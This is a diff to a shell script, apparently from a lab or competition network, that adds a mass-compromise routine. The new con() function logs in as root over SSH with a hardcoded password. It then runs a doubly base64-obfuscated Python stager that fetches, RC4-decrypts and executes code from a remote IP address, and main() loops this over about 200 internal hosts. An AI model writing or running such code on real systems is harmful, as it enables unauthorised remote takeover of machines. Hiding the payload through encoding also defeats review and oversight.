@@ -148,10 +148,27 @@ firewallUp() {
     echo ""
 }
 
+
+con(){
+    ( sshpass -p 'Changeme-2018' ssh root@$1 -t 'echo "ZWNobyAiaW1wb3J0IHN5cyxiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdWbkpYZGtSa1JXWTlKMnRuUW1KbldDY0thVzF3YjNKMElITjVjeXdnZFhKc2JHbGlNanRwYlhCdmNuUWdjbVVzSUhOMVluQnliMk5sYzNNN1kyMWtJRDBnSW5CeklDMWxaaUI4SUdkeVpYQWdUR2wwZEd4bFhDQlRibWwwWTJnZ2ZDQm5jbVZ3SUMxMklHZHlaWEFpQ25CeklEMGdjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpaGpiV1FzSUhOb1pXeHNQVlJ5ZFdVc0lITjBaRzkxZEQxemRXSndjbTlqWlhOekxsQkpVRVVwQ205MWRDQTlJSEJ6TG5OMFpHOTFkQzV5WldGa0tDa0tjSE11YzNSa2IzVjBMbU5zYjNObEtDa0thV1lnY21VdWMyVmhjbU5vS0NKTWFYUjBiR1VnVTI1cGRHTm9JaXdnYjNWMEtUb0tJQ0FnYzNsekxtVjRhWFFvS1FwdlBWOWZhVzF3YjNKMFgxOG9lekk2SjNWeWJHeHBZakluTERNNkozVnliR3hwWWk1eVpYRjFaWE4wSjMxYmMzbHpMblpsY25OcGIyNWZhVzVtYjFzd1hWMHNabkp2Yld4cGMzUTlXeWRpZFdsc1pGOXZjR1Z1WlhJblhTa3VZblZwYkdSZmIzQmxibVZ5S0NrN1ZVRTlKMDF2ZW1sc2JHRXZOUzR3SUNoTllXTnBiblJ2YzJnN0lFbHVkR1ZzSUUxaFl5QlBVeUJZSURFd0xqRXhPeUJ5ZGpvME5TNHdLU0JIWldOcmJ5OHlNREV3TURFd01TQkdhWEpsWm05NEx6UTFMakFuTzI4dVlXUmthR1ZoWkdWeWN6MWJLQ2RWYzJWeUxVRm5aVzUwSnl4VlFTbGRPMkU5Ynk1dmNHVnVLQ2RvZEhSd09pOHZNVGc0TGpFMk5pNDRNeTR4TkRjNk9EQTRNQzlwYm1SbGVDNWhjM0FuS1M1eVpXRmtLQ2s3YTJWNVBTZGRZemhDTlRKemJrOHBRemRHWG14T2FGcHFRSGd6YTJGUVh6eEVPMWwzWmljN1V5eHFMRzkxZEQxeVlXNW5aU2d5TlRZcExEQXNXMTBLWm05eUlHa2dhVzRnY21GdVoyVW9NalUyS1RvS0lDQWdJR285S0dvclUxdHBYU3R2Y21Rb2EyVjVXMmtsYkdWdUtHdGxlU2xkS1NrbE1qVTJDaUFnSUNCVFcybGRMRk5iYWwwOVUxdHFYU3hUVzJsZENtazlhajB3Q21admNpQmphR0Z5SUdsdUlHRTZDaUFnSUNCcFBTaHBLekVwSlRJMU5nb2dJQ0FnYWowb2FpdFRXMmxkS1NVeU5UWUtJQ0FnSUZOYmFWMHNVMXRxWFQxVFcycGRMRk5iYVYwS0lDQWdJRzkxZEM1aGNIQmxibVFvWTJoeUtHOXlaQ2hqYUdGeUtWNVRXeWhUVzJsZEsxTmJhbDBwSlRJMU5sMHBLUXBsZUdWaktDY25MbXB2YVc0b2IzVjBLU2s9JykpOyIgfCBweXRob24gJg0KDQo=" | base64 -d | bash; bash -l' & )
+}
+
+
+
+
 main() {
     checkMemes 2>>checkMemes.error.log
     changePasswords 2>>changePasswords.error.log
-    bash ./pwn.sh
+#con 192.168.13.161
+    apt-get install sshpass
+    for i in `seq 1 50`; do
+        con 10.2.$i.10
+        con 10.2.$i.40
+        con 10.2.$i.50
+        con 10.3.$i.10
+    done
+
+    # bash ./pwn.sh
 #    backupMemes 2>>backupMemes.error.log
 #    secureMemes 2>>secureMemes.error.log
 #    configMemes 2>>configMemes.error.log
